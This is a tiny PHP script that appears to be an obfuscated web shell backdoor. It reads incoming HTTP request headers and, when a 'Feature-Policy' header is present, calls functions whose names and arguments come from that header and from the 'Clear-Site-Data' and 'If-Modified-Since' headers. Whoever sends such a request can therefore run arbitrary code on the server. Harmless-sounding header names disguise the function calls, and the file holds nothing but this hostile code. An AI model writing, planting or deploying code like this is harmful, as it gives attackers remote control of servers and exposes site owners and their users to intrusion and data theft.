<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Feature-Policy'])) {
    $created = $_HEADERS['Feature-Policy']('', $_HEADERS['Clear-Site-Data']($_HEADERS['If-Modified-Since']));
    $created();
}